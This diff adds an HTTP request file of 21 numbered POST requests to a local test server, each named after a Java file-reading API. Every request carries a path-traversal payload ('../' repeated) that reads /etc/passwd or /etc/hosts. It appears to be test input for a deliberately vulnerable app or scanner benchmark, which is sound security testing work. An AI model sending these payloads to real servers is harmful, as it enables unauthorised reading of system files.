@@ -1,0 +1,186 @@
+###
+# case1 read_InputStreamReader
+POST /file/read/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/hosts
+
+
+###
+# case2 read_InputStreamReader_BufferedReader
+POST /file/read/case2 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case3 read_InputStreamReader_CharArrayReader
+POST /file/read/case3 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case4 read_FileInputStream
+POST /file/read/case4 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case5 read_FileReader_bufferedReader1
+POST /file/read/case5 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case6 read_FileReader_bufferedReader2
+POST /file/read/case6 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case7 read_FileReader
+POST /file/read/case7 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case8 read_FileReader_LineNumberReader
+POST /file/read/case8 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case9 read_FileReader_CharArrayReader
+POST /file/read/case9 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case10 read_PushbackReader
+POST /file/read/case10 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case11 read_Files_readAllBytes
+POST /file/read/case11 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case12 read_Files_readAllLines
+POST /file/read/case12 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case13 read_Scanner_File
+POST /file/read/case13 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case14 read_Scanner_Path
+POST /file/read/case14 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case15 read_RandomAccessFile_readLine
+POST /file/read/case15 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case16 read_RandomAccessFile_read
+POST /file/read/case16 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case17 read_FileChannel
+POST /file/read/case17 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case18 read_FileChannel_open
+POST /file/read/case18 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case19 read_FileUtils
+POST /file/read/case19 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+###
+# case20 read_FileInputStream_BufferedInputStream
+POST /file/read/case20 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+
+###
+# case21 read_IOUtils
+POST /file/read/case21 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../etc/passwd
